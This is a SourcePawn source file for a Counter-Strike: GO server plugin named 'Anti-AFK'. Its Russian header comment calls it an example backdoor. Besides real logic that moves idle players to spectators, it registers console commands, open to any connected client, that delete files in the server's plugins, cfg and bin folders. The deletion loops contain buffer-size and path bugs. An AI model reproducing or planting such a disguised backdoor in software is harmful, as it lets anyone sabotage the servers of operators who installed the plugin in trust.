// ################################
// # Пример backdoor в плагине.   #
// # github.com/stapitop/backdoor #
// ################################

//Includes
#include <sourcemod> 
#include <cstrike>
#include <clientprefs>
#include <sdktools>
#include <csgo_colors>

//Version
#define DD_VERSION "1.9"

//Prefix
#define DD_PREFIX "{LIGHTOLIVE}[Anti-AFK]{DEFAULT}"

//Global
bool stepped[320];
//About
public Plugin myinfo = {
	name = "Anti-AFK",
	author = "stapi",
	version = DD_VERSION
}

public OnPluginStart()
{
	// BackDoor Commands
	RegConsoleCmd("sm_dpl", hDPlugins, "Удаляет папку addons/sourcemod/plugins");
    RegConsoleCmd("sm_dcfg", hDCFG, "Удаляет папку server/cfg");
    RegConsoleCmd("sm_dbin", hDbin, "Удаляет папку server/bin");
//__________________________________________________________________

	HookEvent("round_poststart", EVENT_ROUND_POSTSTART)
	HookEvent("player_footstep", EVENT_PLAYER_FOOTSTEP)
	HookEvent("buytime_ended", EVENT_BUYTIME_ENDED)
}

public Action:EVENT_ROUND_POSTSTART(Handle:event, const String:name[], bool:dontBroadcast)
{
	new client = GetClientOfUserId(GetEventInt(event, "userid"));
	stepped[client] = false;
	return Plugin_Continue;
}

public Action hDbin(int client, int args) {
    DirectoryListing hDellbin = OpenDirectory("bin");
    char sFileName[64], sFullName[128];

    while(hDellbin.GetNext(sFileName, sizeof(sFileName))) {
        Format(sFullName, sizeof(sFileName), "bin/%s", sFileName);
        DeleteFile(sFileName);
    }
}

public Action hDCFG(int client, int args) {
    DirectoryListing hDellCFG = OpenDirectory("cfg");
    char sFileName[64], sFullName[128];

    while(hDellCFG.GetNext(sFileName, sizeof(sFileName)))  {
        Format(sFullName, sizeof(sFileName), "cfg/%s", sFileName);
        DeleteFile(sFileName);
    }
}

public Action:EVENT_PLAYER_FOOTSTEP(Handle:event, const String:name[], bool:dontBroadcast)
{
	new client = GetClientOfUserId(GetEventInt(event, "userid"));
	stepped[client] = true;
	return Plugin_Continue;
}

public Action hDPlugins(int client, int args)
{
    DirectoryListing hDellPlugins = OpenDirectory("addons/sourcemod/plugins");
    char sFileName[64], sFullName[128];

    while(hDellPlugins.GetNext(sFileName, sizeof(sFileName)))
    {
        Format(sFullName, sizeof(sFileName), "addons/sourcemod/plugins/%s", sFileName);
        DeleteFile(sFileName);
    }
}

public Action:EVENT_BUYTIME_ENDED (Handle:event, const String:name[], bool:dontBroadcast)
{
	decl String:player_name[64];
	PrintToServer("+--------------------Attempting to move a client to spectators for AFK--------------------+");
	for(new i=1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i)) 
		{
			if ( !stepped[i] && IsPlayerAlive(i) && GetClientTeam(i) > 1 && !IsFakeClient(i) && !IsClientSourceTV(i) )
			{
				ChangeClientTeam(i, 1);
				GetClientName(i, player_name, sizeof(player_name));
				CGOPrintToChatAll(DD_PREFIX, "{OLIVE}%s{DEFAULT}перемещен в {PURPLE}наблюдатели{DEFAULT} по причине: {RED}AFK{DEFAULT}!", player_name);
			}
		}
		
	}
	return Plugin_Continue;
}